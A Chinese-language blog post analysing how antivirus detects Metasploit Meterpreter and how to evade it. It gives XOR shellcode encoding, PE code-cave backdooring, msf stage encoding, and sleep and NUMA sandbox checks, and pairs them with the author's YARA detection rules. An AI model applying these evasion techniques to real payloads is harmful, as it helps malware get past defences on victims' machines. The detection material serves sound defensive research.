---
layout: post
title:  "Meterpreter免杀及对抗分析"
date:   2017-12-22 17:00:01 +0800
categories: MSF 
---

* content
{:toc}





0x00 前言
------------------
本文就常见的一些杀毒软件检测方法及meterpreter远控对抗杀毒软件的思路进行了一些介绍，相关内容可以参考我的上一篇文章[meterpreter技巧分享](http://www.freebuf.com/sectool/118714.html)。  
另外说一句，metasploit是世界上最好的渗透测试工具!



0x01 静态检测与对抗
------------------
### 静态分析原理   

简单的来说，就是通过特征码识别静态文件，杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。

恶意软件匹配规则yara匹配恶意软件的时候就是用的这样的方式。
通过特征来识别抓HASH工具QuarksPwDump，yara规则如下（[查看源码](https://github.com/Yara-Rules/rules/blob/master/malware/TOOLKIT_Pwdump.yar)）
```

/*
  This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.

*/
rule QuarksPwDump_Gen : Toolkit {
meta:
description = "Detects all QuarksPWDump versions"
author = "Florian Roth"
date = "2015-09-29"
score = 80
hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"
hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"
hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"
strings:
$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
$s2 = "%d dumped" fullword ascii
$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
$s4 = "\\SAM-%u.dmp" fullword ascii
condition:
all of them
}

```
可以看到匹配匹配`$s1 $s2 $s3 $s4`全部四条规则及标记为识别。

当然还有通过md5、sha1来计算文件hash识别恶意软件，最简单粗暴而且有效，但是也很容易绕过，也有分段进行hash来识别相似度的方法，原理和上面的特征码识别都是一样的，这里不再赘述。

### 对抗静态分析

#### 1.修改特征码   
-----
特征码的识别也有一些不同的方式，最开始是使用单个特征码来定位，就有了与之对抗的ccl，随着对抗技术的升级，就有了多条的特征码，对应的也就有了`mutilccl, myccl, virtest`，甚至现在github上的自动化特征码识别，技术越来越多样。   

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。   

虽然meterpreter对于我们来说是开源的，但是偶尔编译出来的文件修改一些小地方就能让杀软直接报废，也算是一个保留方法吧，这里限于篇幅我就不贴代码和操作了。      
 
#### 2.加壳  

加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。   


面对这种情况可以考虑用一切冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。     


总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。  

#### 3.shellcode 编译  

metasploit是我认为世界上最好用的渗透测试工具。    

msfvenom不仅提供多种格式的payload，其中就包括shellcode。shellcode对于源码免杀来说基本上是最好用的那种，绕过静态杀软的神器。    

shellcode编译的具体方式请参考我之前的文章[meterpreter技巧分享](http://www.freebuf.com/sectool/118714.html)，这里不再赘述。   

使用msfvenom选择encoder的时候大家一般都会选择shikata_ga_nai这个编码方式（因为x86的encoder里只有它的Rank是excellent），这个encoder的解码和编码过程都是随机生成的。（编码过程可参考[源码](https://github.com/rapid7/metasploit-framework/blob/12198a088132f047e0a86724bc5ebba92a73ac66/modules/encoders/x86/shikata_ga_nai.rb)）。    

但是，这个编码内容是有特征的，经过shikata_ga_nai 编码之后的shellcode必定含有`\xd9\x74\x24\xf4` 这串16进制字符，我写了一个yara规则可以轻松检测到由 shikata_ga_na编码的shellcode，规则如下：  
```

rule Metasploit_Encoder_shikata_ga_nai :decoder {
meta:
description = "Detects shikata_ga_nai encode shellcode"
author = "Green-m"
date = "2017-11-27"

strings:
$hex_string = { d9 74 24 f4 ( ?? ?? | ?? ?? ?? ?? ?? ?? ?? ) c9 b1 }

condition:
$hex_string
}

```
测试结果如图： 

![/styles/images/meterpreter/p1.png]({{ '/styles/images/meterpreter/p1.png' | prepend: site.baseurl }})

当然不止是 shikata_ga_na 编码方式，其他的编码方式特征可能更加明显（x86/fnstenv_mov 的编码方式就被很多杀软能直接检测到，远不如 shikata_ga_na ）。那么如果要对抗这样的情况，只能自己再将编码过后的shellcode进行编码或者加密。       

我这里写一个简单的xor作为demo供大家感受一下，代码如下：

```

unsigned char shellcode[]=
"\x33\xc9\xb1\xc6\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe6";

// the key to xor
unsigned char key[]="\xcc\0xfa\0x1f\0x3d";

// encode shellcode

     for ( i=0; i<(sizeof(shellcode)-1) ; i=i+1)
     {
          shellcode[i]=shellcode[i]^key[i % sizeof(key)];
     }

// decoder
void decode()
{
for (i=0; i<(sizeof(shellcode)-1); i+=1)
     shellcode[i]=shellcode[i]^key[i%sizeof(key)];
}

void executeShellcode()
{
     decode();
     // run shellcode
}

```
#### 4.shellcode植入后门    

目前有不少文章和工具都提供了植入后门的方法。例如shellter，the-backdoor-factory，工具的功能都很强大。   

这里介绍一下手动在code cave（代码间隙）植入后门的方法，整体流程如图：    

![/styles/images/meterpreter/p2.png]({{ '/styles/images/meterpreter/p2.png' | prepend: site.baseurl }})

其中比较关键的部分是调整堆栈平衡，通过`sub esp`, 或者`add esp`, 来调整堆栈，否则执行完payload后的正常程序会崩溃。  

如果没有适合大小的code cave或者payload 的非常大，这个时候可能需要多个code cave一起使用，关键部分如下图流程   

![/styles/images/meterpreter/p3.png]({{ '/styles/images/meterpreter/p3.png' | prepend: site.baseurl }})

还可以结合上一部分的编码或加密，免杀效果很好，大部分的杀软都直接GG .   



#### 5.多平台多语言    

同一种编译器生成的PE文件在某些区段上是有相同或相近的二进制字节的，杀软在收集同一方式生成的大量木马后，很容易就将这些PE文件的特征提取出来加以识别（例如现在`msfvenom`直接生成的exe就是这样的）。因此，通过更改编译环境，让被识别的特征码改变，达到免杀的目的，改变语言也是同样的思路。    

linux下的跨编译器有mingw-w64, tdm-gcc等，veil-evasion的c语言编译器是用的mingw64，而AVET的编译器用的是tdm-gcc，最开始使用时效果还是不错的，用得多了杀软开始有意的提取这些编译器编译后的特征码，就被一杀一个准了。   


 veil作为一个持续更新的免杀框架，利用多种语言进行编译，来实现绕过特征码免杀的目的，使用的语言包括c, python,  ruby,  perl,  powershell,  c#,  go 等，再通过pytoexe或者 pywin32来转换python代码成exe，来保持自己木马的多样性（[payload生成源码](https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/evasion_common/gamemaker.py)）。  



当然还有更猥琐的方式，如转换成js,php,sct等非编译型语言执行，这里就不详细展开了，有兴趣的自己去了解。

#### 6.小结    

静态免杀大概就这样方法，有时候需要结合多种方法一起使用，当然在没有源码的前提下一般都采用第一种和第二种方法，当然也可以考虑反汇编加花加空等修改源码，这样需要投入更多的时间和精力，也对操作者有更高的技能要求。  


0x02 流量检测与对抗
------------------

### 1.Meterpreter的传输加载    


要知道meterpreter的流量特征，首先要搞清楚meterpreter的传输方式。  

metasploit的木马分为两个大类，staged 和stageless 。     


staged类型的木马的运行流程为：  

客户端在从服务器端接收stager后，stager由引导代码loader和payload组成，客户端在内存中分配一段地址将payload暂存起来，再通过loader来加载内存中的payload。这种内存中注入PE文件的方式称为反射型DLL注入。  


stageless的则是将完整的payload都编译在木马中，相对与staged的木马来说，前者体积庞大不灵活，而且容易被杀。

我们以windows/meterpreter/reverse_tcp为例，下面是部分源码（[完整源码](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb)）
```
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}		; To find some functions address such as VirutalAlloc()
      start:
        pop ebp
      #{asm_reverse_tcp(opts)}	; Send and recvice socket connection
      #{asm_block_recv(opts)}	; Do some stuff after recvied payload
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end
  
```
`asm_block_api`部分是用来定义查询API调用地址的函数。    

`asm_reverse_tcp` 部分是用来发送socket请求的。   

`asm_block_recv` 部分是建立连接后，接收服务端发送的stager，再通过 VirtualAlloc() 分配RWX权限的内存，然后执行后续。   

那么大家可以看到，这部分建客户端发起连接的过程其实是没有什么特征的，特征主要是在服务端发送的stager，接下来让我们详细看看发送的stager里是什么。  

为了让客户端运行服务端发送的meterpreter payload，需要先发送一个加载meterpreter_loader，这个引导代码的源码如下（[完整源码地址](https://github.com/rapid7/metasploit-framework/blob/eeb51447afc73f1f0de5b286f914a4954e02f407/lib/msf/core/payload/windows/meterpreter_loader.rb)）：


```
  def asm_invoke_metsrv(opts={})
    ^

    asm = %Q^

        ; prologue
        
          dec ebp              ; 'M'
          pop edx              ; 'Z'
          call $+5              ; call next instruction
          pop ebx              ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp              ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame

        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()

        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)

          ; offset from ReflectiveLoader() to the end of the DLL

          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
```
  
这段代码主要作用是加载反射性注入的引导代码ReflectiveLoader，通过ReflectiveLoader来加载meterpreter及相关配置。

由于篇幅原因，这里我们不深究反射性注入的详细加载方式，知道大概原理即可，如果有兴趣可以阅读[源码](https://github.com/rapid7/ReflectiveDLLInjection)理解。      


### 2.Meterpreter检测     

上面分析这段meterpreter_loader是固定的一段汇编代码，通过nasm将该部分汇编代码转化为机器码如下：   
```
4d5ae8000000005b52455589e581c364130000ffd381c395a40200893b536a0450ffd0
```

该16进制字符串即为meterpreter的特征。为了验证思路，通过抓取流量来查看发送的payload，可以看到传输后发送的payload最开始的部分就是上面的机器码，如图所示：    

![/styles/images/meterpreter/p4.png]({{ '/styles/images/meterpreter/p4.png' | prepend: site.baseurl }})

编写一个yara规则来测试是否能检测到（yara除了能检测静态PE格式文件，也能检测流量文件），规则如下：   
```
rule Metasploit_Meterpreter_Loader :RAT{
meta:
description = "Detects Metasploit Meterpreter Windows Reverse Stager"
author = "Green-m"
date = "2017-12-11"

strings:
$hex_string = { 4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 64 13 00 00 ff d3 81 c3 95 a4 02 00 89 3b 53 6a 04 50 ff d0 }

condition:
$hex_string
}
```

用yara检测传输的流量包，瞬间检测到，如图所示：   

![/styles/images/meterpreter/p5.png]({{ '/styles/images/meterpreter/p5.png' | prepend: site.baseurl }})


注：如果用该yara规则直接检测进程中的内存的话，不管流量怎么加密最终都会解密，然后被yara检测到meterpreter_loader，除了效率较低之外，能绕过就只能靠修改源码了。   

这里限于篇幅限制，其他payload的流量特征请各位看官自己去摸索测试，这里就不多浪费篇幅。   

### 3.对抗流量检测      


既然流量是有特征的，那么有没有办法对流量进行加密呢，答案是肯定的，通过在服务端设置  
```
set EnableStageEncoding true
set StageEncoder x86/fnstenv_mov
```
效果如图所示，（当然这里的stagerencoder可以任意选）  

![/styles/images/meterpreter/p6.png]({{ '/styles/images/meterpreter/p6.png' | prepend: site.baseurl }})  

发送出去的stager就被编码过了，从流量看都是被编码过的数据，看不出来任何特征，如图：  

![/styles/images/meterpreter/p7.png]({{ '/styles/images/meterpreter/p7.png' | prepend: site.baseurl }})  

如果你觉得这种对流量进行编码的方式也不够保险，那么msf还提供了偏执模式（paranoid-mode），可以用证书对流量进行加密。具体操作方法可以参考官方文档或者[我的博客](https://green-m.github.io/2016/11/23/msf-paranoid-mode/)。  

0x03 动态检测对抗
------------------

静态检测和流量监测都说到了，接下来我们说如何对抗沙盒。要做到完全对抗沙盒工程量是很大的，这里我们只讲一些猥琐的小技巧来骗过杀软的沙盒分析。  

杀毒软件最大的问题就是面对成千上万的文件，如何最快速度的扫描完所有的文件，而不浪费大量的性能在单个文件上（在扫描过程中把机器卡死是相当糟糕的体验）。要做到这个，需要在大量的文件中进行合理的取舍。  

### 1.sleep      


在很早的对抗杀软的技术中，通过一个sleep，占用大量的时间，就能够绕过杀软的动态分析，当然现在这样肯定是不行的了。推测杀软会hook 系统sleep函数，然后直接略过，直接后面的代码，这样是最聪明和省事儿的方法了。为了验证想法，我们通过一段代码来测试一下。  

为了除去别的容易干扰的因素，我选择使用固定的一种编译器对shellcode进行编译。  

 
直接编译生成，virustotal的结果如下，`19/67`

![/styles/images/meterpreter/p8.png]({{ '/styles/images/meterpreter/p8.png' | prepend: site.baseurl }})

添加如下的代码之后再进行检测：   
```
time_begin = GetTickCount() ;
Sleep(5555);
time_end = GetTickCount();
DWORD time_cost = time_end - time_begin;

if((time_cost > time_sleep+5) || (time_cost < (time_sleep - 5)))
{return 0;}
runshellcode();
```
检测`16/66`  

![/styles/images/meterpreter/p9.png]({{ '/styles/images/meterpreter/p9.png' | prepend: site.baseurl }})  

虽然只减少了3个，不过也说明部分杀软还是吃这一套。   

### 2.NUMA       


NUMA代表Non Uniform Memory Access（非一致内存访问）。它是一个在多系统中配置内存管理的方法。它与定义在Kernel32.dll中所有一系列函数连接在一起。 

更多的信息可以参考官方文档：  
http://msdn.microsoft.com/en-us/library/windows/desktop/aa363804(v=vs.85).aspx  

代码如下：  

```
address = VirtualAllocExNuma(handle, NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
if (address == NULL){return 0;}
runshellcode();

```
检测结果17/67，又少了两个。  

![/styles/images/meterpreter/p10.png]({{ '/styles/images/meterpreter/p10.png' | prepend: site.baseurl }})

### 3.总结      


这里截图的效果不好主要是因为`stagerd meterpreter`是没有什么行为的，主要是靠静态查杀，如果行为明显那么这些方法还是能起到不少的效果。  

还有很多其他的一些技巧，由于篇幅原因就不过多的介绍了。  
有兴趣可以参考[维基解密](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)。  


0x04 结语  
------------------  
最近老有兄弟跟我交流免杀的事情，尤其是meterpreter的免杀方式，花了点时间研究并写下了这篇文章，希望各位读者能够有所收获。  

如果你有任何问题欢迎与我交流，[博客](https://green-m.github.io/)或者[微博](https://weibo.com/u/2585957090) 。  

最后 Metasploit是世界上最好的渗透测试工具！

**参考资料**
- - -
https://simonuvarov.com/blog/msfvenom-reverse-tcp-waitforsingleobject/  
https://haiderm.com/fully-undetectable-backdooring-pe-files/  
https://github.com/rapid7/ReflectiveDLLInjection  
https://github.com/Veil-Framework/
https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf 


